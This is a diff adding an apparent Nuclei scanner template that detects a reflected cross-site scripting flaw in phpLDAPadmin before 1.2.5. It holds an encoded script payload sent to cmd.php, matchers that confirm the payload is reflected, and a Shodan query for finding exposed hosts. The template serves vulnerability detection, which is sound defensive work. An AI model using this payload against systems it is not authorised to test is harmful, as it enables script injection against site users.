@@ -1,0 +1,61 @@
+# RAG Annotation:
+# name: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
+# description: PHP LDAP Admin is vulnerable to XSS.
+# vuln_type: Cross-Site Scripting (XSS)
+# severity: medium
+# cve_id: N/A
+
+
+---
+id: phpldapadmin-xss
+
+info:
+  name: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
+  author: GodfatherOrwa,herry
+  severity: medium
+  description: PHP LDAP Admin is vulnerable to XSS.
+  reference:
+    - https://twitter.com/GodfatherOrwa/status/1701392754251563477
+  classification:
+    cpe: cpe:2.3:a:phpldapadmin_project:phpldapadmin:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 9
+    vendor: phpldapadmin_project
+    product: phpldapadmin
+    shodan-query: html:"phpLDAPadmin"
+  tags: php,phpldapadmin,xss,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}{{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1"
+      - "{{BaseURL}}{{path}}/index.php?redirect=true&meth=ajax"
+
+    attack: pitchfork
+    payloads:
+      path:
+        - /
+        - /htdocs/index.php
+        - /phpldapadmin
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.domain)</script>"
+          - "No such entry"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
